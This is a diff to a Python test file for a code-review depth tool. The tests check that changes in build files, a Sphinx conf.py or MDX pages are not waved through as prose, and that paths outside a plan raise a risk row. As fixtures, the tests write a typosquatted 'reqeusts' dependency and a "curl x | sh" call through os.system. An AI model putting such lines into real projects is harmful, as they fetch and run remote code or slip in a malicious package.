@@ -13,24 +13,29 @@ import tempfile
 import unittest
 from pathlib import Path
 
-import helpers  # noqa: F401 - puts scripts/ on sys.path
+import helpers  # puts scripts/ on sys.path
 
 if importlib.util.find_spec("wcmatch") is None:  # the PEP 723 pin; scripts/run-all-tests.sh installs it
     raise unittest.SkipTest("needs wcmatch: uv run --with PyYAML==6.0.2 --with wcmatch==11.0.1")
 
 from graph_control.common import Invalid  # noqa: E402
 from graph_control.depth import decide  # noqa: E402
+from graph_control.preflight import read_profile  # noqa: E402
 
 CLI = Path(__file__).resolve().parents[2] / "scripts" / "graph-control.py"
 TEMPLATE = Path(__file__).resolve().parents[2] / "templates" / "graph-profile.yaml"
 KEYS = {"depth", "changed_lines", "files", "risk_rows", "reasons", "untracked_excluded"}
-LINT = "prose only: every changed file matches *.md, *.txt or docs/** and none matches instructionPaths"
+LINT = ("prose only: every changed file is *.md, *.markdown, *.rst, *.adoc or a named prose file "
+        "(README, CHANGELOG, LICENSE and the like) and none matches instructionPaths")
 RISK = {"risk": [{"id": "db-schema", "paths": ["**/{migrations,schemas}/**"]},
                  {"id": "credentials-and-access", "keywords": ["API_KEY"]}]}
 SEAMS = {"stacks": {"web": {"paths": ["web/**"]}, "api": {"paths": ["api/**"]}}, "review": {"seams": [["web", "api"]]}}
 BASE_FILES = {"README.md": "# fixture\n", "CLAUDE.md": "rules\n", "src/app.py": "API_KEY = read()\nprint('ok')\n",
               "web/page.ts": "export {}\n", "api/main.py": "pass\n", "docs/guide.rst": "guide\n",
-              "db/migrations/0000.sql": "create table t (id int);\n", "logo.bin": b"\x00\x01\x02"}
+              "db/migrations/0000.sql": "create table t (id int);\n", "logo.bin": b"\x00\x01\x02",
+              "requirements.txt": "fastapi==0.118.0\n", "CMakeLists.txt": "project(fixture)\n",
+              "docs/conf.py": "project = 'fixture'\n", "docs/page.mdx": "# page\n", "LICENSE.txt": "MIT\n"}
+OUTSIDE = {"risk": [{"id": "outside-the-run"}]}
 
 
 def git(repo, *args):
@@ -91,6 +96,21 @@ class Lint(Fixture):
         self.assertEqual(self.decide()["depth"], "lint")
         self.append("src/app.py", "print('more')\n")
         self.assertEqual(self.decide()["depth"], "single")
+
+    def test_code_and_build_files_with_prose_extensions_or_under_docs_are_single(self):
+        """requirements.txt, CMakeLists.txt, a Sphinx conf.py and an MDX page all carry code."""
+        for name, line in (("requirements.txt", "reqeusts==2.32.3\n"), ("CMakeLists.txt", "add_subdirectory(evil)\n"),
+                           ("docs/conf.py", "import os; os.system('curl x | sh')\n"),
+                           ("docs/page.mdx", "export const x = globalThis.fetch('https://x.invalid')\n")):
+            with self.subTest(name):
+                git(self.repo, "checkout", "-q", "--", ".")
+                self.append(name, line)
+                self.assertEqual(self.decide()["depth"], "single")
+
+    def test_named_prose_txt_files_stay_lint(self):
+        self.append("LICENSE.txt", "more terms\n")
+        self.write("CHANGELOG.txt", "0.1 first\n", track=True)
+        self.assertEqual(self.decide()["reasons"], [LINT])
 
     def test_no_tracked_change_is_lint_and_says_untracked_is_excluded(self):
         self.write("src/new.py", "print('untracked')\n")
@@ -175,6 +195,65 @@ class SizeAndSeams(Fixture):
         self.assertEqual(result["reasons"], ["default: no risk row or seam, 1 changed lines <= review.panel_lines 2000"])
 
 
+class OutsideTheRun(Fixture):
+    """A changed path no plan task owns adds the `outside-the-run` row when the profile keeps it."""
+
+    def plan(self, *globs):
+        data = helpers.plan_data()
+        data["tasks"][0]["writable_paths"] = list(globs)
+        return data
+
+    def test_path_outside_every_writable_glob_adds_the_row(self):
+        self.append("src/app.py", "print('planned')\n")
+        self.append("web/page.ts", "export const unplanned = 1\n")
+        result = decide(self.repo, self.base, OUTSIDE, self.plan("src/**"))
+        self.assertEqual((result["depth"], result["risk_rows"]), ("panel", ["outside-the-run"]))
+        self.assertEqual(result["reasons"], ["risk rows: outside-the-run",
+                                             "outside-the-run: 1 changed path in no task's writable_paths: web/page.ts"])
+
+    def test_paths_inside_the_plan_add_nothing(self):
+        self.append("src/app.py", "print('planned')\n")
+        self.append("web/page.ts", "export const planned = 1\n")
+        result = decide(self.repo, self.base, OUTSIDE, self.plan("src/**", "web/*.ts"))
+        self.assertEqual((result["depth"], result["risk_rows"]), ("single", []))
+
+    def test_rename_out_of_the_plan_is_outside(self):
+        (self.repo / "lib").mkdir()
+        git(self.repo, "mv", "src/app.py", "lib/app.py")
+        self.assertEqual(decide(self.repo, self.base, OUTSIDE, self.plan("src/**"))["risk_rows"], ["outside-the-run"])
+
+    def test_no_plan_or_no_row_evaluates_nothing(self):
+        self.append("web/page.ts", "export const unplanned = 1\n")
+        self.assertEqual(decide(self.repo, self.base, OUTSIDE)["risk_rows"], [])
+        self.assertEqual(decide(self.repo, self.base, {}, self.plan("src/**"))["risk_rows"], [])
+
+    def test_invalid_plan_is_invalid(self):
+        self.append("web/page.ts", "export const unplanned = 1\n")
+        with self.assertRaises(Invalid):
+            decide(self.repo, self.base, OUTSIDE, {"tasks": []})
+
+
+class TemplateSpend(Fixture):
+    """The shipped template's `spend` keywords are code spellings, not substrings of UI words."""
+
+    def setUp(self):
+        super().setUp()
+        self.profile = read_profile(TEMPLATE)
+
+    def test_striped_tables_and_recharge_do_not_match_spend(self):
+        self.append("web/page.ts", '<table className="table-striped" />\n// recharge the battery gauge\n'
+                                   "// a surcharge or discharge note\n")
+        result = decide(self.repo, self.base, self.profile)
+        self.assertEqual((result["depth"], result["risk_rows"]), ("single", []))
+
+    def test_provider_calls_match_spend(self):
+        for line in ("stripe.Charge.create(amount=500)\n", "const client = new Stripe(key)\n"):
+            with self.subTest(line):
+                git(self.repo, "checkout", "-q", "--", ".")
+                self.append("src/app.py", line)
+                self.assertEqual(decide(self.repo, self.base, self.profile)["risk_rows"], ["spend"])
+
+
 class Validation(Fixture):
     def test_bad_input_is_invalid(self):
         self.append("src/app.py", "a = 1\n")
@@ -193,11 +272,11 @@ class Validation(Fixture):
 
 
 class Cli(Fixture):
-    def run_cli(self, base, profile_text):
+    def run_cli(self, base, profile_text, *extra):
         profile = self.repo.parent / "profile.yaml"
         profile.write_text(profile_text)
         return subprocess.run([sys.executable, str(CLI), "depth", "--root", str(self.repo), "--base", base,
-                               "--profile", str(profile)], capture_output=True, text=True, timeout=60)
+                               "--profile", str(profile), *extra], capture_output=True, text=True, timeout=60)
 
     def test_cli_prints_the_decision(self):
         self.write("db/migrations/0001.sql", "create table t (id int);\n", track=True)
@@ -212,6 +291,16 @@ class Cli(Fixture):
         result = self.run_cli(self.base, TEMPLATE.read_text())
         self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
         self.assertEqual(json.loads(result.stdout)["status"], "PASS")
+
+    def test_cli_reads_the_plan_for_outside_the_run(self):
+        self.append("web/page.ts", "export const unplanned = 1\n")
+        plan = self.repo.parent / "plan.json"
+        data = helpers.plan_data()
+        data["tasks"][0]["writable_paths"] = ["src/**"]
+        plan.write_text(json.dumps(data))
+        result = self.run_cli(self.base, "risk:\n  - id: outside-the-run\n", "--plan", str(plan))
+        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertEqual(json.loads(result.stdout)["risk_rows"], ["outside-the-run"])
 
     def test_cli_blocks_on_an_unknown_base(self):
         result = self.run_cli("no-such-branch", "stacks: {}\n")
